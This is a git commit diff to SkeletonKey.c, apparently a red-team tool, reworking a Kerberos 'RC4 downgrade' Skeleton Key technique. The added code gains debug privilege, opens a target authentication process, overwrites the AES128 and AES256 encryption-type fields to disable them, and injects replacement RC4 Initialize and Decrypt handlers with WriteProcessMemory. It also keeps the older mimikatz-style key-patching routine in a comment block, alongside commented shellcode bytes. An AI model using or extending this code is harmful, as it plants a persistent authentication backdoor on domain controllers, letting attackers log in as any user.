9663238c95492144b31c986285e756c374303521
lem0nSec <frascacaccia.96@gmail.com>
2023-12-21 15:56:40 +0100

    RC4 downgrade technique edited.

--- src/SkeletonKey.c
+++ src/SkeletonKey.c
@@ -113,16 +113,17 @@ BOOL Skel_InstallOnKerbAuth(DWORD processID)
 {
 	BOOL status = FALSE;
 	PCDLOCATECSYSTEM CDLocateCSystem = 0;
-	PKERB_ECRYPT pCrypt = 0;
+	PKERB_ECRYPT pCrypt_aes128 = 0, pCrypt_aes256 = 0, pCrypt = 0;
 	SK_MODULE_INFORMATION pCryptInfo = { 0 };
 	PLSA_UNICODE_STRING lsaPatternRemoteStruct = 0;
 	LSA_UNICODE_STRING lsaPatternLocalStruct = { 0 };
 	HANDLE hProcess = 0;
 	HMODULE LocalCryptdllBase = 0;
 	LPVOID pattern_data = 0, pattern_struct = 0;
-	BOOL keysPatched = FALSE;
+	BOOL aesPackagesDisabled = FALSE;
 	LPVOID Buffer = 0, RemoteFunctions = 0, pInitialize = 0, pDecrypt = 0;
 	SIZE_T szFunc = (SIZE_T)((PBYTE)Skel_rc4_end - (PBYTE)Skel_rc4_init);
+	unsigned char patch[] = "\xff";
 	SK_FUNCTION_PTR RemotePtrs[] = {
 		{L"ntdll.dll", "memcpy", (PVOID)0x4141414141414141, NULL},
 		{L"kernel32.dll", "LocalAlloc", (PVOID)0x4242424242424242, NULL},
@@ -131,111 +132,80 @@ BOOL Skel_InstallOnKerbAuth(DWORD processID)
 		{NULL, NULL, (PVOID)0x4b4b4b4b4b4b4b4b, NULL} // decrypt
 	};
 
-	if (Skel_EnableDebugPrivilege() == TRUE)
+	if (Skel_EnableDebugPrivilege())
 	{
 		PRINT_SUCCESS(L"Debug privilege ok\n");
 		hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, processID);
 		if (hProcess != NULL)
 		{
-			if (Skel_GetRemoteModuleInformation(processID, (LPWSTR)kdcsvc, &pCryptInfo) == TRUE)
+			LocalCryptdllBase = GetModuleHandle(cryptdll);
+			if (LocalCryptdllBase == NULL)
 			{
-				PRINT_SUCCESS(L"Module found : %s ( 0x%-016p )\n", kdcsvc, pCryptInfo.dllBase);
-				pattern_data = Skel_SearchRemotePatternInLoadedModule(hProcess, &pCryptInfo, (LPCVOID)newerKey, wcslen(newerKey));
-				if (pattern_data != 0)
-				{
-					PRINT_SUCCESS(L"First pattern found : 0x%-016p\n", pattern_data);
-					pattern_struct = Skel_SearchRemotePatternInLoadedModule(hProcess, &pCryptInfo, (LPCVOID)&pattern_data, sizeof(LPCVOID));
-					if (pattern_struct != 0)
-					{
-						PRINT_SUCCESS(L"Second pattern found : 0x%-016p\n", pattern_struct);
-						lsaPatternRemoteStruct = (PLSA_UNICODE_STRING)((DWORD_PTR)pattern_struct - FIELD_OFFSET(LSA_UNICODE_STRING, Buffer));
-						keysPatched = WriteProcessMemory(hProcess, lsaPatternRemoteStruct, (LPCVOID)&lsaPatternLocalStruct, sizeof(LSA_UNICODE_STRING), NULL);
-						SecureZeroMemory(&pCryptInfo, sizeof(SK_MODULE_INFORMATION));
-					}
-					else
-						PRINT_ERROR(L"Second pattern not found. System already patched (?). Aborting...\n");
-				}
-				else
-					PRINT_ERROR(L"First pattern not found. Aborting...\n");
+				LocalCryptdllBase = LoadLibrary(cryptdll);
 			}
-			else
-				PRINT_ERROR(L"%s not found (0x%ld). Aborting...\n", kdcsvc, GetLastError());
-
-			if (keysPatched)
+			if (LocalCryptdllBase != NULL)
 			{
-				PRINT_SUCCESS(L"Keys patch ok\n");
-				if (Skel_GetRemoteModuleInformation(processID, (LPWSTR)cryptdll, &pCryptInfo) == TRUE)
+				CDLocateCSystem = (PCDLOCATECSYSTEM)GetProcAddress(LocalCryptdllBase, "CDLocateCSystem");
+				if (CDLocateCSystem != 0)
 				{
-					LocalCryptdllBase = GetModuleHandle(cryptdll);
-					if (LocalCryptdllBase == NULL)
+					if ((NT_SUCCESS(CDLocateCSystem(0x11, &pCrypt_aes128))) && (NT_SUCCESS(CDLocateCSystem(0x12, &pCrypt_aes256))))
 					{
-						LocalCryptdllBase = LoadLibrary(cryptdll);
+						aesPackagesDisabled = WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pCrypt_aes128 + FIELD_OFFSET(KERB_ECRYPT, EncryptionType)), patch, sizeof(ULONG), NULL);
+						aesPackagesDisabled = WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pCrypt_aes256 + FIELD_OFFSET(KERB_ECRYPT, EncryptionType)), patch, sizeof(ULONG), NULL);
 					}
-					if (LocalCryptdllBase != NULL)
+				}
+			}
+			
+			if (aesPackagesDisabled)
+			{
+				PRINT_SUCCESS(L"AES packages successfully disabled\n");
+				if (NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_RC4_HMAC_NT, &pCrypt)))
+				{
+					PRINT_SUCCESS(L"KERB_ETYPE_RC4_HMAC_NT located: 0x%-016p\n", pCrypt);
+					Buffer = (LPVOID)LocalAlloc(LPTR, szFunc);
+					if (Buffer != NULL)
 					{
-						CDLocateCSystem = (PCDLOCATECSYSTEM)GetProcAddress(LocalCryptdllBase, "CDLocateCSystem");
-						if (CDLocateCSystem != NULL)
+						RtlCopyMemory(Buffer, Skel_rc4_init, szFunc);
+						RemotePtrs[3].Ptr = pCrypt->Initialize;
+						RemotePtrs[4].Ptr = pCrypt->Decrypt;
+						RemoteFunctions = Skel_ResolveFakeFunctionPointers(hProcess, Buffer, (DWORD)szFunc, (PSK_FUNCTION_PTR)&RemotePtrs, (DWORD)(sizeof(RemotePtrs) / sizeof(SK_FUNCTION_PTR)), TRUE);
+						if (RemoteFunctions != NULL)
 						{
-							if (NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_RC4_HMAC_NT, &pCrypt)))
+							PRINT_SUCCESS(L"Handlers up and ready\n");
+							pInitialize = RemoteFunctions;
+							pDecrypt = (LPVOID)((DWORD_PTR)RemoteFunctions + (DWORD)((DWORD_PTR)Skel_rc4_init_decrypt - (DWORD_PTR)Skel_rc4_init));
+							if (
+								(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Initialize)), (LPCVOID)&pInitialize, sizeof(PVOID), NULL)) &&
+								(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Decrypt)), (LPCVOID)&pDecrypt, sizeof(PVOID), NULL))
+								)
 							{
-								PRINT_SUCCESS(L"KERB_ETYPE_RC4_HMAC_NT located: 0x%-016p\n", pCrypt);
-								Buffer = (LPVOID)LocalAlloc(LPTR, szFunc);
-								if (Buffer != NULL)
-								{
-									RtlCopyMemory(Buffer, Skel_rc4_init, szFunc);
-									RemotePtrs[3].Ptr = pCrypt->Initialize;
-									RemotePtrs[4].Ptr = pCrypt->Decrypt;
-									RemoteFunctions = Skel_ResolveFakeFunctionPointers(hProcess, Buffer, (DWORD)szFunc, (PSK_FUNCTION_PTR)&RemotePtrs, (DWORD)(sizeof(RemotePtrs) / sizeof(SK_FUNCTION_PTR)), TRUE);
-									if (RemoteFunctions != NULL)
-									{
-										PRINT_SUCCESS(L"Handlers up and ready\n");
-										pInitialize = RemoteFunctions;
-										pDecrypt = (LPVOID)((DWORD_PTR)RemoteFunctions + (DWORD)((DWORD_PTR)Skel_rc4_init_decrypt - (DWORD_PTR)Skel_rc4_init));
-										if (
-											(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Initialize)), (LPCVOID)&pInitialize, sizeof(PVOID), NULL)) &&
-											(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Decrypt)), (LPCVOID)&pDecrypt, sizeof(PVOID), NULL))
-											)
-										{
-											PRINT_SUCCESS(L"Connectors ok\n");
-											status = TRUE;
-										}
-										else
-										{
-											PRINT_ERROR(L"Patching error. Freeing memory...\n");
-											VirtualFreeEx(hProcess, RemoteFunctions, 0, MEM_RELEASE);
-										}
-									}
-									else
-										PRINT_ERROR(L"Remote function building error.\n");
-								}
-								else
-									PRINT_ERROR(L"Heap allocation error.\n");
+								PRINT_SUCCESS(L"Connectors ok\n");
+								status = TRUE;
 							}
 							else
-								PRINT_ERROR(L"CDLocateCSystem error.\n");
+							{
+								PRINT_ERROR(L"Patching error. Freeing memory...\n");
+								VirtualFreeEx(hProcess, RemoteFunctions, 0, MEM_RELEASE);
+							}
 						}
 						else
-							PRINT_ERROR(L"CDLocateCSystem ptr error.\n");
+							PRINT_ERROR(L"Remote function building error.\n");
 					}
 					else
-						PRINT_ERROR(L"%s loading failure. Aborting...\n", cryptdll);
+						PRINT_ERROR(L"Heap allocation error.\n");
 				}
 				else
-					PRINT_ERROR(L"%s not found (0x%ld). Aborting...\n", kdcsvc, GetLastError());
+					PRINT_ERROR(L"CDLocateCSystem error.\n");
 			}
-
 			CloseHandle(hProcess);
 		}
 		else
 			PRINT_ERROR(L"Could not open process %d (0x%ld). Aborting...\n", processID, GetLastError());
 	}
-	else
-		PRINT_ERROR(L"Insufficient privileges (0x%ld). Aborting...\n", GetLastError());
 
 	return status;
 
 }
-
 
 BOOL Skel_InstallOnNtlmAuth(DWORD processID)
 {
@@ -371,6 +341,10 @@ help:
 }
 
 
+
+
+
+
 /*
 
 unsigned char ds_attr_not_found[] =
@@ -378,4 +352,136 @@ unsigned char ds_attr_not_found[] =
 "\xb8\xac\x02\x00\xc0"		// mov rax, 0x00000000c00002ac STATUS_DS_ATTRIBUTE_NOT_FOUND
 "\xc3";						// ret
 
+*/
+
+/*
+* 
+* mimikatz newer kerberos keys patching
+* 
+BOOL Skel_InstallOnKerbAuth(DWORD processID)
+{
+	BOOL status = FALSE;
+	PCDLOCATECSYSTEM CDLocateCSystem = 0;
+	PKERB_ECRYPT pCrypt = 0;
+	SK_MODULE_INFORMATION pCryptInfo = { 0 };
+	PLSA_UNICODE_STRING lsaPatternRemoteStruct = 0;
+	LSA_UNICODE_STRING lsaPatternLocalStruct = { 0 };
+	HANDLE hProcess = 0;
+	HMODULE LocalCryptdllBase = 0;
+	LPVOID pattern_data = 0, pattern_struct = 0;
+	BOOL keysPatched = FALSE;
+	LPVOID Buffer = 0, RemoteFunctions = 0, pInitialize = 0, pDecrypt = 0;
+	SIZE_T szFunc = (SIZE_T)((PBYTE)Skel_rc4_end - (PBYTE)Skel_rc4_init);
+	SK_FUNCTION_PTR RemotePtrs[] = {
+		{L"ntdll.dll", "memcpy", (PVOID)0x4141414141414141, NULL},
+		{L"kernel32.dll", "LocalAlloc", (PVOID)0x4242424242424242, NULL},
+		{L"kernel32.dll", "LocalFree", (PVOID)0x4343434343434343, NULL},
+		{NULL, NULL, (PVOID)0x4a4a4a4a4a4a4a4a, NULL}, // init
+		{NULL, NULL, (PVOID)0x4b4b4b4b4b4b4b4b, NULL} // decrypt
+	};
+
+	if (Skel_EnableDebugPrivilege() == TRUE)
+	{
+		PRINT_SUCCESS(L"Debug privilege ok\n");
+		hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, processID);
+		if (hProcess != NULL)
+		{
+			if (Skel_GetRemoteModuleInformation(processID, (LPWSTR)kdcsvc, &pCryptInfo) == TRUE)
+			{
+				PRINT_SUCCESS(L"Module found : %s ( 0x%-016p )\n", kdcsvc, pCryptInfo.dllBase);
+				pattern_data = Skel_SearchRemotePatternInLoadedModule(hProcess, &pCryptInfo, (LPCVOID)newerKey, wcslen(newerKey));
+				if (pattern_data != 0)
+				{
+					PRINT_SUCCESS(L"First pattern found : 0x%-016p\n", pattern_data);
+					pattern_struct = Skel_SearchRemotePatternInLoadedModule(hProcess, &pCryptInfo, (LPCVOID)&pattern_data, sizeof(LPCVOID));
+					if (pattern_struct != 0)
+					{
+						PRINT_SUCCESS(L"Second pattern found : 0x%-016p\n", pattern_struct);
+						lsaPatternRemoteStruct = (PLSA_UNICODE_STRING)((DWORD_PTR)pattern_struct - FIELD_OFFSET(LSA_UNICODE_STRING, Buffer));
+						keysPatched = WriteProcessMemory(hProcess, lsaPatternRemoteStruct, (LPCVOID)&lsaPatternLocalStruct, sizeof(LSA_UNICODE_STRING), NULL);
+						SecureZeroMemory(&pCryptInfo, sizeof(SK_MODULE_INFORMATION));
+					}
+					else
+						PRINT_ERROR(L"Second pattern not found. System already patched (?). Aborting...\n");
+				}
+				else
+					PRINT_ERROR(L"First pattern not found. Aborting...\n");
+			}
+			else
+				PRINT_ERROR(L"%s not found (0x%ld). Aborting...\n", kdcsvc, GetLastError());
+
+			if (keysPatched)
+			{
+				PRINT_SUCCESS(L"Keys patch ok\n");
+				if (Skel_GetRemoteModuleInformation(processID, (LPWSTR)cryptdll, &pCryptInfo) == TRUE)
+				{
+					LocalCryptdllBase = GetModuleHandle(cryptdll);
+					if (LocalCryptdllBase == NULL)
+					{
+						LocalCryptdllBase = LoadLibrary(cryptdll);
+					}
+					if (LocalCryptdllBase != NULL)
+					{
+						CDLocateCSystem = (PCDLOCATECSYSTEM)GetProcAddress(LocalCryptdllBase, "CDLocateCSystem");
+						if (CDLocateCSystem != NULL)
+						{
+							if (NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_RC4_HMAC_NT, &pCrypt)))
+							{
+								PRINT_SUCCESS(L"KERB_ETYPE_RC4_HMAC_NT located: 0x%-016p\n", pCrypt);
+								Buffer = (LPVOID)LocalAlloc(LPTR, szFunc);
+								if (Buffer != NULL)
+								{
+									RtlCopyMemory(Buffer, Skel_rc4_init, szFunc);
+									RemotePtrs[3].Ptr = pCrypt->Initialize;
+									RemotePtrs[4].Ptr = pCrypt->Decrypt;
+									RemoteFunctions = Skel_ResolveFakeFunctionPointers(hProcess, Buffer, (DWORD)szFunc, (PSK_FUNCTION_PTR)&RemotePtrs, (DWORD)(sizeof(RemotePtrs) / sizeof(SK_FUNCTION_PTR)), TRUE);
+									if (RemoteFunctions != NULL)
+									{
+										PRINT_SUCCESS(L"Handlers up and ready\n");
+										pInitialize = RemoteFunctions;
+										pDecrypt = (LPVOID)((DWORD_PTR)RemoteFunctions + (DWORD)((DWORD_PTR)Skel_rc4_init_decrypt - (DWORD_PTR)Skel_rc4_init));
+										if (
+											(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Initialize)), (LPCVOID)&pInitialize, sizeof(PVOID), NULL)) &&
+											(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Decrypt)), (LPCVOID)&pDecrypt, sizeof(PVOID), NULL))
+											)
+										{
+											PRINT_SUCCESS(L"Connectors ok\n");
+											status = TRUE;
+										}
+										else
+										{
+											PRINT_ERROR(L"Patching error. Freeing memory...\n");
+											VirtualFreeEx(hProcess, RemoteFunctions, 0, MEM_RELEASE);
+										}
+									}
+									else
+										PRINT_ERROR(L"Remote function building error.\n");
+								}
+								else
+									PRINT_ERROR(L"Heap allocation error.\n");
+							}
+							else
+								PRINT_ERROR(L"CDLocateCSystem error.\n");
+						}
+						else
+							PRINT_ERROR(L"CDLocateCSystem ptr error.\n");
+					}
+					else
+						PRINT_ERROR(L"%s loading failure. Aborting...\n", cryptdll);
+				}
+				else
+					PRINT_ERROR(L"%s not found (0x%ld). Aborting...\n", kdcsvc, GetLastError());
+			}
+
+			CloseHandle(hProcess);
+		}
+		else
+			PRINT_ERROR(L"Could not open process %d (0x%ld). Aborting...\n", processID, GetLastError());
+	}
+	else
+		PRINT_ERROR(L"Insufficient privileges (0x%ld). Aborting...\n", GetLastError());
+
+	return status;
+
+}
 */
